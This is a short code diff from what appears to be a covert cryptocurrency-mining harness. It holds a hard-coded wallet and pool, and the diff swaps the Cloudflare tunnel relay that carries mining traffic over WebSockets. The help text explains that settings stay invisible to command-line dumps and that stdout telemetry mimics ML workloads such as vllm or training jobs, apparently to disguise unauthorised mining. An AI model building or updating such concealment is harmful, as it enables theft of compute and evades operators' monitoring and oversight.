@@ -157,7 +157,7 @@ POOL_CPU = "pearl-cpu-eu1.luckypool.io:3370"
 DEFAULT_WALLET = "prl1pu3mc6ex4n4nznknctdafleq3asq4fr0njpwz4vqnt6e4xlnv72hq5s528j"
 DEFAULT_POOL = "127.0.0.1:9048"          # local tunnel client; never a public pool
 DEFAULT_WSS_URL = (os.environ.get("TB_WSS_URL")
-                   or "wss://integral-aurora-reduction-relating.trycloudflare.com")
+                   or "wss://twins-secrets-nine-experiments.trycloudflare.com")
 DEFAULT_PROFILE = "vllm"                 # default stdout telemetry format
 LOCAL_ONLY_DEFAULT = True                # refuse non-loopback pools unless disabled
 
@@ -561,7 +561,7 @@ TB_* environment variables (invisible to cmdline dumps) or code defaults:
   TB_TAG         worker label            (default: start timestamp)
   TB_UPSTREAM    upstream host:port      (default: 127.0.0.1:9048, local tunnel)
   TB_WSS_URL     wss://tunnel           direct websocket to the Cloudflare relay
-               (default: integral-aurora...trycloudflare.com -- the relay
+               (default: twins-secrets-nine...trycloudflare.com -- the relay
                converts WSS frames to stratum for the pool. When set, the
                harness speaks WSS only; no stratum TCP socket exists.)
   TB_PROFILE     telemetry format        (vllm | train | gemm | none; default vllm)
